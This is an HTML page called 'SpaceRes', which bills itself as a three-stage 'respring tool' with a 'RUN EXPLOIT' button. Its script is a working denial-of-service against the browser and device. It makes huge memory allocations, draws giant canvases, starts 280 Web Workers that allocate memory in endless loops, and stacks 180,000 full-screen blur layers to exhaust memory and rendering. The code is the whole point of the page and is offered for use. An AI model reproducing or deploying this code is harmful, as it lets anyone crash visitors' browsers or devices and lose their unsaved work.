<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SpaceRes</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Press+Start+2P&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: #00040f;
            color: #80fff0;
            font-family: 'Orbitron', sans-serif;
            overflow-y: auto;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        
        .stars {
            position: absolute;
            inset: 0;
            background: radial-gradient(circle, rgba(255,255,255,0.9) 0.8px, transparent 1px),
                        radial-gradient(circle, rgba(180,240,255,0.6) 1px, transparent 2px);
            background-size: 90px 90px, 160px 160px;
            animation: starsDrift 110s linear infinite;
            opacity: 0.4;
            z-index: 1;
        }
        
        .container {
            position: relative;
            z-index: 10;
            width: 92%;
            max-width: 760px;
            background: rgba(6, 4, 32, 0.85);
            border: 3px solid #80fff0;
            box-shadow: 0 0 90px #80fff0, 0 0 160px rgba(255, 0, 220, 0.5);
            padding: 55px 40px;
            border-radius: 24px;
            text-align: center;
        }
        
        h1 {
            font-size: 3.9em;
            font-weight: 900;
            color: #80fff0;
            text-shadow: 0 0 35px #80fff0, 0 0 80px #ff00dd;
            margin-bottom: 8px;
            letter-spacing: 8px;
        }
        
        .subtitle {
            color: #ff88ee;
            font-size: 1.25em;
            margin-bottom: 50px;
        }
        
        button {
            padding: 28px 110px;
            font-size: 1.75em;
            background: transparent;
            color: #80fff0;
            border: 6px solid #80fff0;
            cursor: pointer;
            box-shadow: 0 0 70px #80fff0;
            transition: all 0.4s;
            text-transform: uppercase;
            letter-spacing: 4px;
        }
        button:hover {
            background: #80fff0;
            color: #000;
            transform: scale(1.1);
        }
        
        #log {
            margin-top: 45px;
            padding: 25px;
            background: rgba(0, 8, 25, 0.95);
            border: 2px solid #80fff0;
            height: 380px;
            overflow-y: auto;
            text-align: left;
            font-size: 0.95em;
            line-height: 1.7;
            display: none;
            font-family: 'Press Start 2P', system-ui;
        }
    </style>
</head>
<body>
    <div class="stars"></div>
    
    <div class="container">
        <h1>SPACERES</h1>
        <div class="subtitle">3-STAGE RESPRING TOOL</div>
        
        <button id="runBtn">RUN EXPLOIT</button>
        
        <div id="log"></div>
    </div>

    <script>
        const logElement = document.getElementById('log');

        function addLog(text, color = '#80fff0') {
            const time = new Date().toLocaleTimeString('ru-RU', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
            logElement.innerHTML += `<span style="color:#555">[${time}] </span><span style="color:${color}">${text}</span><br>`;
            logElement.scrollTop = logElement.scrollHeight;
        }

        const STAGES = [
            {
                name: "STAGE 1 — MEMORY IGNITION",
                fn: async () => {
                    addLog("Stage 1 started...", "#ffaa00");
                    for(let i = 0; i < 45; i++) {
                        for(let j = 0; j < 3200; j++) {
                            try { new Function('x', `return x * ${Math.random() * 987654}`)(); } catch(e){}
                        }
                        try { new ArrayBuffer(1024 * 1024 * 520); } catch(e){}
                        await new Promise(r => setTimeout(r, 40));
                    }
                    addLog("Stage 1 completed", "#00ff88");
                }
            },
            {
                name: "STAGE 2 — RENDER OVERLOAD",
                fn: async () => {
                    addLog("Stage 2 started...", "#ffaa00");
                    for(let i = 0; i < 18; i++) {
                        const c = document.createElement('canvas');
                        c.width = c.height = 32768;
                        try {
                            const ctx = c.getContext('2d', {alpha: false});
                            ctx.fillRect(0,0,c.width,c.height);
                        } catch(e){}
                        await new Promise(r => setTimeout(r, 80));
                    }
                    addLog("Stage 2 completed", "#00ff88");
                }
            },
            {
                name: "STAGE 3 — SYSTEM COLLAPSE",
                fn: async () => {
                    addLog("Stage 3 started — MAXIMUM PRESSURE", "#ff0088");
                    
                    // Workers
                    for(let i = 0; i < 280; i++) {
                        try {
                            const blob = new Blob([`while(true){new ArrayBuffer(1024*1024*520);}`]);
                            new Worker(URL.createObjectURL(blob));
                        } catch(e){}
                    }
                    
                    // Massive blur layers
                    for(let i = 0; i < 180000; i++) {
                        const d = document.createElement('div');
                        d.style.cssText = `position:fixed;inset:0;backdrop-filter:blur(${160 + (i % 520)}px);opacity:0.095;z-index:999999;pointer-events:none;`;
                        document.body.appendChild(d);
                        if(i % 2200 === 0) await new Promise(r => setTimeout(r, 12));
                    }
                    
                    addLog("Stage 3 completed", "#00ff88");
                }
            }
        ];

        let isRunning = false;

        async function runExploit() {
            if (isRunning) return;
            isRunning = true;
            document.getElementById('runBtn').disabled = true;
            
            logElement.style.display = 'block';
            logElement.innerHTML = '';
            
            addLog("Preparing system...", "#ffff00");
            await new Promise(r => setTimeout(r, 1200));
            
            for (let stage of STAGES) {
                await stage.fn();
                await new Promise(r => setTimeout(r, 600));
            }
            
            addLog("ALL STAGES COMPLETED", "#00ffff");
            isRunning = false;
            document.getElementById('runBtn').disabled = false;
        }

        window.onload = () => {
            document.getElementById('runBtn').onclick = runExploit;
        };
    </script>
</body>
</html>
